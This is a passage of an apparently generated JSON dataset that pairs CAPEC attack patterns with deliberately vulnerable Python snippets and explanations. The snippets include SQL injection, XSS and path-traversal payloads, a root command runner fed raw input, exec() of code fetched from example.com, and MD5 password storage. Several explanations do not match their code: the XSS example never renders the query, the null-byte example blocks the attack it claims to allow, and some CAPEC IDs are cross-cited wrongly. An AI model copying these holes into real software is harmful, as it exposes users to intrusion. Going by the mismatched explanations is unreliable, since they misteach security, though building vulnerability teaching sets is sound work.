        "description": "This Python code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code stores user passwords in a recoverable format (MD5 hash) and uses a simple security question for password recovery. If an attacker knows or guesses the security answer, they can retrieve the hashed password, which is susceptible to further attacks. This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials)."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate a poisoned registry with incorrect WSDL information\npoisoned_wsdl = '''\n<definitions>\n    <service name=\"MaliciousService\">\n        <port name=\"MaliciousPort\" binding=\"tns:MaliciousBinding\">\n            <soap:address location=\"http://malicious.example.com/service\"/>\n        </port>\n    </service>\n</definitions>\n'''\n\n# Parse the poisoned WSDL\nroot = ET.fromstring(poisoned_wsdl)\n\n# Simulate storing the poisoned WSDL in cleartext in a registry\nregistry = {}\nregistry['service_wsdl'] = poisoned_wsdl\n\n# Simulate a service requester looking up the WSDL from the registry\ndef lookup_service_wsdl(service_name):\n    if service_name in registry:\n        return registry[service_name]\n    else:\n        return None\n\n# Service requester looks up the WSDL\nwsdl = lookup_service_wsdl('service_wsdl')\nif wsdl:\n    print(\"Retrieved WSDL:\")\n    print(wsdl)\nelse:\n    print(\"Service not found in registry.\")",
        "description": "This Python code snippet simulates a poisoned web service registry scenario. The registry contains a WSDL (Web Service Definition Language) file with incorrect information, redirecting the service requester to a malicious service provider. The WSDL is stored in cleartext, representing CWE-314. The code demonstrates how a service requester might look up the WSDL from the registry, potentially leading to a phishing attack (CAPEC-160). The code also highlights the lack of proper authorization checks (CWE-285) and the exposure of sensitive WSDL information (CWE-651)."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import os\n\ndef read_file(filename):\n    if '\\0' in filename:\n        raise ValueError(\"Null byte detected in filename\")\n    with open(filename, 'r') as file:\n        return file.read()\n\n# Vulnerable code\nuser_input = input(\"Enter the filename: \")\ncontent = read_file(user_input)\nprint(content)\n\n# Example of an attack\n# An attacker could input 'example.txt\\0.png'\n# The null byte would terminate the string early, causing the program to read 'example.txt' instead of 'example.txt.png'\n",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `read_file` function is designed to read the contents of a file given its filename. However, if the filename contains a null byte ('\\0'), it raises a ValueError to prevent the attack. The vulnerable part of the code is where user input is taken directly and passed to the `read_file` function without proper validation. An attacker could exploit this by providing a filename with an embedded null byte, such as 'example.txt\\0.png', causing the program to read 'example.txt' instead of 'example.txt.png'. This demonstrates CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "def is_valid_path(path):\n    # Check if the path ends with a slash\n    if path.endswith('/'):\n        return True\n    return False\n\n# User input\nuser_input = \"valid_path\\0/invalid_path\"\n\n# Validate the path\nif is_valid_path(user_input):\n    print(\"Path is valid\")\nelse:\n    print(\"Path is invalid\")",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Postfix, Null Terminate, and Backslash'. The function 'is_valid_path' checks if a given path ends with a slash ('/'). However, the user input 'user_input' contains a null byte ('\\0') followed by an invalid path. The null byte can terminate the string early in some contexts, causing the 'is_valid_path' function to incorrectly validate the path as valid. This example embodies CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-20 (Improper Input Validation), as the input is not properly sanitized or validated, leading to potential security issues."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Database connection\nconn = sqlite3.connect('example.db', check_same_thread=False)\ncursor = conn.cursor()\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    try:\n        # Vulnerable to SQL Injection\n        cursor.execute(f\"SELECT * FROM users WHERE name LIKE '%{query}%' \")\n        results = cursor.fetchall()\n        return jsonify(results)\n    except Exception as e:\n        # Exposing sensitive error message\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask and SQLite. The application has a '/search' endpoint that takes a 'query' parameter from the URL. The code directly incorporates this parameter into an SQL query without proper sanitization, making it susceptible to SQL Injection (CWE-89). Additionally, if an error occurs, the application returns the raw error message, potentially exposing sensitive information (CWE-209). This snippet embodies the main idea of CAPEC-166, where an adversary probes the application by submitting various queries to extract information beyond what is intended."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\n# Weak password hashing function\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# Simulated database of user passwords (hashed)\n# CWE-261: Weak Encoding for Password\nuser_db = {\n    'user1': hash_password('password123'),  # CWE-521: Weak Password Requirements\n    'user2': hash_password('123456'),       # CWE-521: Weak Password Requirements\n}\n\n# Function to simulate an attacker using a rainbow table\n# CWE-654: Reliance on a Single Factor in a Security Decision\ndef rainbow_table_attack(hashed_password):\n    rainbow_table = {\n        '5f4dcc3b5aa765d61d8327deb882cf99': 'password',\n        'e10adc3949ba59abbe56e057f20f883e': '123456',\n    }\n    return rainbow_table.get(hashed_password, None)\n\n# Simulate an attack\nfor user, hashed_pw in user_db.items():\n    cracked_password = rainbow_table_attack(hashed_pw)\n    if cracked_password:\n        print(f\"User {user}'s password is: {cracked_password}\")\n    else:\n        print(f\"User {user}'s password could not be cracked.\")",
        "description": "This Python code snippet demonstrates a vulnerable password storage and cracking scenario. It uses a weak hashing function (MD5) to hash passwords, which is insufficiently secure (CWE-916). The user database contains weak passwords (CWE-521), and the hashing function does not provide adequate protection (CWE-261). The code simulates an attacker using a rainbow table to crack the hashed passwords (CAPEC: Rainbow Table Password Cracking). The reliance on a single factor (the password hash) for security decisions is highlighted (CWE-654). This example underscores the importance of using strong, computationally intensive hashing algorithms and enforcing strong password policies to mitigate such attacks."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\n# Simulated server-side security mechanism\nclass Server:\n    def __init__(self):\n        self.secret_key = 'server_secret'\n\n    def generate_token(self, user_id):\n        return hashlib.sha256((user_id + self.secret_key).encode()).hexdigest()\n\n# Client-side enforcement of server-side security\nclass Client:\n    def __init__(self, server):\n        self.server = server\n\n    def authenticate(self, user_id):\n        # Vulnerable: Client generates the token instead of the server\n        token = hashlib.sha256((user_id + 'client_secret').encode()).hexdigest()\n        return self.server.validate_token(user_id, token)\n\n# Simulated server-side validation\nclass Server:\n    def __init__(self):\n        self.secret_key = 'server_secret'\n\n    def validate_token(self, user_id, token):\n        expected_token = hashlib.sha256((user_id + self.secret_key).encode()).hexdigest()\n        return token == expected_token\n\n# Example usage\nserver = Server()\nclient = Client(server)\nuser_id = 'user123'\n\n# Vulnerable authentication process\nif client.authenticate(user_id):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side enforcement of server-side security (CWE-602). The server has a method to generate a secure token using a secret key. However, the client incorrectly attempts to generate the token itself using a different secret key ('client_secret'). This bypasses the server's security mechanism, leading to a potential authentication bypass vulnerability (CWE-294). The code represents the main idea of the deprecated CAPEC pattern by showing how removing or short-circuiting guard logic on the client side can lead to security issues."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# Vulnerable endpoint URL\nurl = 'http://example.com/api/userinfo'\n\n# Sensitive data included in the query string\nparams = {\n    'user_id': '12345',\n    'auth_token': 'sensitive_token'\n}\n\n# Making a GET request\nresponse = requests.get(url, params=params)\n\n# Print the response\nprint(response.text)",
        "description": "This Python code snippet demonstrates a REST API request that is vulnerable to several security weaknesses described in the CAPEC and related CWEs. The code sends a GET request to a hypothetical endpoint 'http://example.com/api/userinfo' with sensitive information (user_id and auth_token) included in the query string. This embodies CWE-598 (Use of GET Request Method With Sensitive Query Strings) as it exposes sensitive data in the URL. Additionally, the code does not verify the identity of the actors at both ends of the communication channel (CWE-300) and does not ensure proper authentication (CWE-287). The lack of protection mechanisms (CWE-693) and the potential for external control of critical state data (CWE-642) are also implied vulnerabilities. This example highlights how REST's trust in system resources can be exploited to obtain sensitive data once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Dummy data representing user roles and their permissions\nusers = {\n    'admin': {'role': 'admin'},\n    'user1': {'role': 'user'},\n}\n\n# Dummy data representing resources\nresources = {\n    'resource1': 'This is a protected resource.'\n}\n\n# Function to check if the user has admin privileges\ndef is_admin(user):\n    return users.get(user, {}).get('role') == 'admin'\n\n@app.route('/resource/<resource_id>', methods=['GET', 'PUT', 'DELETE'])\ndef manage_resource(resource_id):\n    user = request.args.get('user')\n    if resource_id not in resources:\n        return jsonify({'error': 'Resource not found'}), 404\n\n    if request.method == 'GET':\n        return jsonify({'resource': resources[resource_id]})\n    elif request.method == 'PUT' or request.method == 'DELETE':\n        # Improper authorization check\n        if not is_admin(user):\n            return jsonify({'error': 'Unauthorized'}), 403\n        if request.method == 'PUT':\n            resources[resource_id] = request.data.get('data', 'Updated resource')\n            return jsonify({'message': 'Resource updated'}), 200\n        elif request.method == 'DELETE':\n            del resources[resource_id]\n            return jsonify({'message': 'Resource deleted'}), 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple RESTful API that manages resources. The code demonstrates a vulnerability where improper authorization checks are performed. Specifically, the `is_admin` function is used to check if a user has admin privileges, but this check is only applied to PUT and DELETE methods, not GET. This represents CWE-285 (Improper Authorization) and CWE-650 (Trusting HTTP Permission Methods on the Server Side). An attacker could exploit this by accessing resources they shouldn't be able to via GET requests, or by manipulating the user parameter to gain unauthorized access to PUT and DELETE operations, embodying the main idea of the CAPEC 'Restful Privilege Elevation'."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport string\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def generate_session_id(self):\n        # CWE-330: Use of Insufficiently Random Values\n        # CWE-331: Insufficient Entropy\n        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))  # Insufficient length and randomness\n\n    def create_session(self, user_id):\n        session_id = self.generate_session_id()\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        # CWE-346: Origin Validation Error\n        # CWE-285: Improper Authorization\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n# Example usage\nsession_manager = SessionManager()\nsession_id = session_manager.create_session('user123')\nprint(f'Session ID: {session_id}')\nuser = session_manager.get_user(session_id)\nprint(f'User: {user}')",
        "description": "This Python code snippet demonstrates a vulnerable session management system. The `generate_session_id` method creates session IDs using insufficiently random values (CWE-330) and insufficient entropy (CWE-331), making them predictable. The session ID length is also too short, increasing the likelihood of prediction (CWE-6). The `get_user` method does not properly validate the origin of the session ID (CWE-346) and does not perform proper authorization checks (CWE-285), allowing potential unauthorized access. This code embodies the main idea of CAPEC 'Session Credential Falsification through Prediction' by showing how predictable session IDs can lead to session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "from flask import Flask, request, session\nimport hashlib\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        sessions[username] = session_id\n        session['session_id'] = session_id\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/protected', methods=['GET'])\ndef protected():\n    session_id = session.get('session_id')\n    if session_id in sessions.values():\n        return 'Access to protected resource'\n    return 'Access denied'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session replay attacks. The application has a login route that authenticates users and assigns a session ID based on a hash of the username and password. The session ID is stored in a global dictionary and in the user's session. The protected route checks if the session ID in the user's session is valid by comparing it to the stored session IDs. This design is vulnerable to session replay attacks because an attacker who captures a valid session ID can reuse it to gain unauthorized access to the protected resource. The code also demonstrates related weaknesses such as improper authorization (CWE-285) and exposure of sensitive information (CWE-200)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    user = request.form['username']\n    password = request.form['password']\n    if authenticate(user, password):\n        session['user'] = user\n        # Vulnerable: Session ID is not regenerated after login\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return 'Please log in first'\n\ndef authenticate(username, password):\n    # Dummy authentication for demonstration\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to a session fixation attack. The main idea of the CAPEC is represented by the fact that the session identifier is not regenerated after the user successfully logs in. This allows an attacker to fixate a session ID and use it after the victim logs in, gaining unauthorized access. The related CWEs are reflected in the improper control of the session resource (CWE-664), incorrect permission assignment (CWE-732), and client-side enforcement of server-side security (CWE-602). The code does not invalidate the existing session identifier upon authentication, which is the core issue described in CWE-384."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n# Simulated user session data\nuser_sessions = {'user1': 'session_cookie_value'}\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    # Extract session cookie from request\n    session_cookie = request.cookies.get('session_cookie')\n    \n    # Check if session cookie is valid (simulated check)\n    if session_cookie in user_sessions.values():\n        # Perform the transfer action (vulnerable to CSRF)\n        amount = request.form.get('amount')\n        recipient = request.form.get('recipient')\n        return f'Transferred {amount} to {recipient}'\n    else:\n        return 'Invalid session', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Cross-Site Request Forgery (CSRF). The '/transfer' endpoint simulates a money transfer action that checks for a valid session cookie but does not verify if the request was intentionally made by the user. This lack of verification makes the application susceptible to CSRF attacks, where an attacker can craft a malicious request that 'rides' the user's session cookie to perform unauthorized actions. The code also highlights related weaknesses such as missing authentication for critical functions (CWE-306) and improper control of resources (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS: directly embedding user input in HTML without proper sanitization\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks. The application has a single route '/search' that takes a 'query' parameter from the URL. The user input is directly embedded into the HTML response using Flask's render_template_string function without any sanitization or validation. This lack of proper input neutralization (CWE-79) and improper input validation (CWE-20) allows an attacker to inject malicious scripts. For example, an attacker could craft a URL like '/search?query=<script>alert(1)</script>' to execute arbitrary JavaScript in the context of the victim's browser. This snippet embodies the main idea of CAPEC-63 by showing how an adversary can exploit improper handling of user input to execute malicious scripts in a web browser."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "from urllib.parse import unquote\nimport os\n\n# Simulated restricted directory\nRESTRICTED_DIR = '/var/www/restricted'\n\n# Function to check if the path is within the restricted directory\ndef is_within_restricted_dir(path):\n    # Normalize the path to prevent directory traversal\n    normalized_path = os.path.normpath(path)\n    return normalized_path.startswith(RESTRICTED_DIR)\n\n# Function to handle incoming URL\ndef handle_request(url):\n    # Decode the URL\n    decoded_url = unquote(url)\n    print(f\"Decoded URL: {decoded_url}\")\n\n    # Check if the decoded URL is within the restricted directory\n    if is_within_restricted_dir(decoded_url):\n        print(\"Access granted to:\", decoded_url)\n    else:\n        print(\"Access denied.\")\n\n# Example of a potentially malicious URL\nmalicious_url = '/var/www/restricted/..%2F..%2Fetc%2Fpasswd'\nhandle_request(malicious_url)",
        "description": "This Python code snippet demonstrates a vulnerability related to improper handling of URL encoding and path traversal. The `handle_request` function decodes a given URL using `unquote` from the `urllib.parse` module, which converts percent-encoded characters back to their original form. The `is_within_restricted_dir` function checks if the decoded path is within a restricted directory by normalizing the path to prevent directory traversal attacks. However, the code is vulnerable because it does not properly neutralize special elements in the path, allowing an attacker to craft a URL that bypasses the directory restriction. This embodies the main idea of the CAPEC by showing how improper handling of URL encoding and path validation can lead to security issues."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# Downloading code without integrity check (CWE-494)\nurl = 'http://example.com/update.py'\nresponse = requests.get(url)\n\n# Cleartext transmission of sensitive information (CWE-319)\nif response.status_code == 200:\n    exec(response.text)  # Executing downloaded code without verification\nelse:\n    print('Failed to download the update.')",
        "description": "This Python code snippet demonstrates a scenario where an application downloads and executes code from a remote server without performing any integrity checks (CWE-494). The code is transmitted in cleartext (CWE-319), making it susceptible to sniffing attacks. An adversary could intercept the communication, capture the code, and potentially modify it to exploit the trust relationship between the client and server. This embodies the main idea of the CAPEC 'Sniff Application Code', where an attacker passively captures application code during transmission."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# User input\nuser_input = \"' OR '1'='1\"\n\n# Vulnerable SQL query\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n\ntry:\n    # Execute the query\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    # Error message containing sensitive information\n    print(f\"An error occurred: {e}\")\nfinally:\n    # Close the cursor\n    cursor.close()\n    conn.close()",
        "description": "This Python code snippet demonstrates a basic SQL Injection vulnerability. The code connects to an SQLite database and constructs an SQL query using user input without proper validation or sanitization. The user input is directly embedded into the SQL query, making it susceptible to SQL Injection attacks. In this example, the user input is crafted to always return true (' OR '1'='1'), which can lead to unauthorized access to data. Additionally, the code includes an error handling mechanism that prints detailed error messages, potentially exposing sensitive information. Finally, the cursor is closed properly to avoid dangling database cursor issues."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef log_message(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    syslog.syslog(user_input)\n\nif __name__ == '__main__':\n    user_input = input('Enter log message: ')\n    log_message(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable use of the syslog() function, which is the main idea of the CAPEC 'String Format Overflow in syslog()'. The function log_message() takes user input and directly passes it to syslog.syslog() without any format string parameter, leading to a format string injection vulnerability (CWE-134). An attacker can exploit this by providing a malicious input that includes format specifiers, potentially causing a buffer overflow or other unintended behavior. This example highlights the importance of proper input validation and the dangers of using externally-controlled format strings."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# Weak hash function (CWE-328)\ndef sign_code(code):\n    return hashlib.md5(code.encode()).hexdigest()\n\n# Simulate code signing\ncode = \"print('Hello, world!')\"\nsigned_code = sign_code(code)\n\n# Malicious code injection (CWE-506)\nmalicious_code = \"print('Malicious code executed!')\"\nmalicious_signed_code = sign_code(malicious_code)\n\n# Subverting code-signing by replacing legitimate code with malicious code\nif signed_code == malicious_signed_code:\n    exec(malicious_code)\nelse:\n    exec(code)",
        "description": "This Python code snippet demonstrates a subversion of code-signing facilities by using a weak hash function (MD5, CWE-328) to sign code. The `sign_code` function generates a hash for a given code snippet. The legitimate code and a malicious code snippet are both signed using this weak hash function. Due to the weak hash, it is possible for an attacker to find a collision where the hash of the malicious code matches the hash of the legitimate code. The code then executes the malicious code instead of the legitimate code if the hashes match, illustrating how subverting code-signing mechanisms can lead to the execution of untrusted code. This example embodies the main idea of the CAPEC by showing how weak cryptographic practices can be exploited to escalate privileges or execute malicious code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\nimport subprocess\n\ndef run_as_root(command):\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root\")\n    subprocess.run(command, shell=True)\n\nuser_input = input(\"Enter the command to run: \")\nrun_as_root(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable program that runs with elevated privileges and executes user-provided commands. The `run_as_root` function checks if the script is executed with root privileges and then runs the user-provided command using `subprocess.run` with `shell=True`. This setup is vulnerable to CWE-78 (OS Command Injection) because it directly uses user input to construct and execute an OS command without proper sanitization. The code also exemplifies CWE-250 (Execution with Unnecessary Privileges) as it requires root privileges to run, which can amplify the impact of any vulnerabilities present. The main idea of the CAPEC is represented by showing how an attacker could exploit a program running with elevated privileges to execute arbitrary commands."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\ndefault_username = 'admin'\ndefault_password = 'admin'\n\n# Weak password requirements (CWE-521)\ncommon_passwords = ['password', '123456', 'secret', 'admin']\n\n# Function to simulate login\ndef login(username, password):\n    if username == default_username and password == default_password:\n        return True\n    if password in common_passwords:\n        return True\n    return False\n\n# Simulate user login\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nif login(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable login system that embodies the main idea of CAPEC-111: 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and weak password requirements (CWE-521). The `login` function checks if the provided username and password match the hard-coded default credentials or if the password is one of the common weak passwords. This represents the vulnerability where an adversary can gain unauthorized access by trying default or common credentials. The code highlights the importance of removing default credentials and enforcing strong password policies to prevent such attacks."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return False\n    \n    # Canonicalize the input (decode Unicode)\n    canonical_input = user_input.encode('utf-8').decode('unicode_escape')\n    \n    # Check for disallowed patterns after canonicalization\n    if re.search(r'[<>\"\\\n]', canonical_input):\n        return False\n    \n    return True\n\n# Example usage\nuser_input = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\"\nprint(is_valid_input(user_input))  # This should return False but will return True due to improper handling",
        "description": "This Python code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The function `is_valid_input` first performs early validation on the input string using a regular expression to check for alphanumeric characters. However, this validation occurs before the input is canonicalized (decoded from Unicode). After canonicalization, the input is checked again for disallowed patterns, but by this time, the malicious input has already bypassed the initial validation. This represents the CAPEC idea of using Unicode encoding to bypass validation logic, and it incorporates related CWEs such as improper handling of Unicode encoding (CWE-176), early validation (CWE-179), and improper input validation (CWE-20). The example usage shows how a Unicode-encoded XSS payload can bypass the validation, highlighting the vulnerability."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import os\nfrom urllib.parse import unquote\n\ndef read_file_from_url(url):\n    # CWE-20: Improper Input Validation\n    if not url.startswith('http://example.com/files/'): \n        raise ValueError('Invalid URL')\n    \n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    decoded_path = unquote(url[len('http://example.com/files/'):])\n    \n    # CWE-73: External Control of File Name or Path\n    file_path = os.path.join('/var/www/files', decoded_path)\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    if '..' in file_path or file_path.endswith(('.exe', '.sh')):\n        raise ValueError('Invalid file path')\n    \n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nurl = 'http://example.com/files/../../etc/passwd'\nprint(read_file_from_url(url))",
        "description": "This Python code snippet demonstrates a vulnerability related to URL encoding and improper handling of file paths. The function `read_file_from_url` takes a URL, decodes it, and attempts to read a file from the server's filesystem. The code includes several CWE-related issues: CWE-20 (Improper Input Validation) by not thoroughly validating the URL, CWE-177 (Improper Handling of URL Encoding) by decoding the URL without proper checks, CWE-73 (External Control of File Name or Path) by allowing user input to influence the file path, and CWE-74 (Improper Neutralization of Special Elements) by not adequately sanitizing the file path. This can lead to directory traversal attacks or unauthorized file access."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    # Vulnerable code: directly using user-controlled filename\n    file.save(os.path.join('/uploads', filename))\n    return 'File uploaded successfully'\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    # Vulnerable code: directly using user-controlled filename in HTML\n    return render_template_string('<h1>Viewing file: {}</h1>'.format(filename))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to the 'User-Controlled Filename' attack pattern described in the CAPEC. The application has two routes: '/upload' for uploading files and '/view/<filename>' for viewing files. The '/upload' route saves the uploaded file using the user-provided filename without proper validation or sanitization, leading to CWE-20 (Improper Input Validation) and CWE-184 (Incomplete List of Disallowed Inputs). The '/view/<filename>' route directly uses the user-controlled filename in an HTML context without proper encoding or escaping, leading to CWE-116 (Improper Encoding or Escaping of Output) and CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages). This can allow an attacker to inject malicious characters or scripts, potentially leading to XSS attacks."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\nimport os\nimport pickle\n\n# Simulate user state stored in a cookie\nuser_state = {'username': 'user1', 'balance': 100}\ncookie = pickle.dumps(user_state)\n\n# Adversary manipulates the state by modifying the cookie\nmanipulated_state = pickle.loads(cookie)\nmanipulated_state['balance'] = 1000000  # Elevate privilege by increasing balance\n\n# Application reads the manipulated state\nuser_state = manipulated_state\n\n# Simulate a transaction\nif user_state['balance'] > 500:\n    print('Transaction approved for user:', user_state['username'])\nelse:\n    print('Transaction denied for user:', user_state['username'])",
        "description": "This Python code snippet demonstrates the concept of 'Manipulating State' by simulating a scenario where an adversary modifies user state information stored in a cookie. The user state includes a username and balance, which is serialized using the pickle module. The adversary then deserializes the cookie, manipulates the balance to a high value, and the application reads this manipulated state, allowing the adversary to conduct fraudulent transactions. This example highlights vulnerabilities such as CWE-315 (Cleartext Storage of Sensitive Information in a Cookie) and CWE-372 (Incomplete Internal State Distinction), showing how improper state management can lead to security issues."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\n\n# Configuration file path\nconfig_file_path = 'config/settings.conf'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate reading configuration\nconfig_data = read_config(config_file_path)\n\n# Simulate an attacker modifying the configuration\nattacker_data = 'admin=true\\n'\nconfig_data += attacker_data\n\n# Write the modified configuration back to the file\nwrite_config(config_file_path, config_data)\n\n# Simulate using the configuration\nif 'admin=true' in read_config(config_file_path):\n    os.system('echo \"Admin privileges granted\"')\nelse:\n    os.system('echo \"Standard user privileges\"')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate a writable configuration file to gain unauthorized access. The code reads a configuration file, simulates an attacker appending malicious data ('admin=true'), and writes the modified configuration back to the file. When the configuration is read again, the presence of 'admin=true' grants admin privileges, which is executed via a system command. This example embodies the CAPEC of 'Manipulating Writeable Configuration Files' and incorporates related CWEs such as 'Acceptance of Extraneous Untrusted Data With Trusted Data' (CWE-349), 'Improper Control of Resource Identifiers' (CWE-99), and 'Command Injection' (CWE-77)."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n@app.route('/download', methods=['GET'])\ndef download_file():\n    filename = request.args.get('file')\n    if not filename:\n        return 'No file specified', 400\n    try:\n        # Vulnerable to Path Traversal\n        file_path = os.path.join('/var/www/files', filename)\n        return send_file(file_path)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that allows users to download files from a server. The main idea of the CAPEC is represented by the vulnerability in the `download_file` function, where user input is used to construct a file path without proper validation or sanitization. This makes the code susceptible to path traversal attacks (CWE-23, CWE-22), where an attacker can manipulate the 'file' parameter to access files outside the intended directory. The code also exemplifies CWE-73 (External Control of File Name or Path) and CWE-77 (Command Injection) by allowing user input to influence file system operations without proper neutralization of special elements. The lack of proper authorization checks (CWE-285) and origin validation (CWE-346) further exacerbates the security risks."
    },
    {
